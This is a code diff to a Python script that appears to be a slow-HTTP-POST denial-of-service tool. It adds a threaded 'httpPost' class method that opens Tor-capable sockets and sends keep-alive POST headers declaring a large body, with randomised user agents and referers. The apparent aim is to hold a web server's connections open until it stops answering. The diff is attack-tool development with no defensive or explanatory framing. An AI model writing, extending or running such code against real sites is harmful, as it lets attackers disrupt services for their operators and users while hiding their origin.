@@ -55,6 +55,8 @@ def useragent_list():
 	
 
 ##################D1MOD FILE 
+##################################################################################################
+	
 class httpPost(Thread):
     def __init__(self, host, port, tor):
         Thread.__init__(self)
@@ -63,9 +65,18 @@ class httpPost(Thread):
         self.socks = socks.socksocket()
         self.tor = tor
         self.running = True
-##################################################################################################
-	
 
+    def _send_http_post(self, pause=10):
+        global stop_now
+
+        self.socks.send("POST / HTTP/1.1\r\n"
+                        "Host: %s\r\n"
+                        "User-Agent: %s\r\n"
+                        "Connection: keep-alive\r\n"
+                        "Keep-Alive: 900\r\n"
+                        "Content-Length: 10000\r\n"
+                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
+                        (self.host, random.choice(useragents)))
 		
 # generates a referer array
 def referer_list():
